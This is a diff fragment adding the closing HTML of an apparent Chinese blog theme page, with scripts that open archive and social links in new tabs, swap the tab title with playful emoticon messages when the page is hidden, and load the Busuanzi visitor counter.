+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
